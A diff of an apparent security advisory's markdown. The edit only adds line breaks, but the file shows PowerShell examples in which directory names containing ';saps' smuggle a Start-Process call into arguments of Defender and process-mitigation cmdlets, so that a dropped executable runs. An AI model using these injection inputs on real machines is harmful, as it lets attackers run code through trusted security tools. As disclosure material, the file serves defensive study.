@@ -104,10 +104,10 @@ Examples: <br>
 powershell Start-MpScan -Scanpath "C:\Users\gg\Downloads\;saps Helper;.1.zip"
 (Helper.exe lives on Desktop)
 
-Create directory  ";saps Test", Test.exe, Test.cmd etc is on same CL path
+Create directory  ";saps Test", Test.exe, Test.cmd etc is on same CL path <br>
 powershell Add-MpPreference -ControlledFolderAccessAllowedApplications ";saps Test"
 
-Create directory with semicolon, drop PE file named doom.exe in same path.
+Create directory with semicolon, drop PE file named doom.exe in same path.  <br>
 powershell Set-ProcessMitigation -PolicyFilePath  "test;saps doom"
 
 https://www.youtube.com/watch?v=0Go6yJiRWP8
